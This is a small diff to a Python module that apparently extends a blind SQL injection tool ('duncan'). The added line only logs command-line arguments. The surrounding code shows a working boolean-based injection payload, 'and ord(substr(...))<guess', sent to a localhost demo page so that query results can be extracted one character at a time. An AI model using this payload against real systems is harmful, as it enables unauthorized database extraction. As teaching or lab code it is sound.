@@ -10,6 +10,7 @@ class SimpleDuncan(duncan.Duncan): # Inherit from Duncan
 		# self._pos is the position of the character to be guessed
 		url="http://localhost/demo/sqli/blind.php?p=1 and ord(substr((%s),%d,1))<%d" % (self._query,self._pos,guess)
 		self.debug(6,url) # You can use the parents method for debug output
+		self.debug(6,"Command line arguments for the module: %s" % repr(self._argv)) # You can access command line parameters too (e.g. session ID)
 		r=requests.get(url) 
 		
 		if r.content.find(':)')>-1:
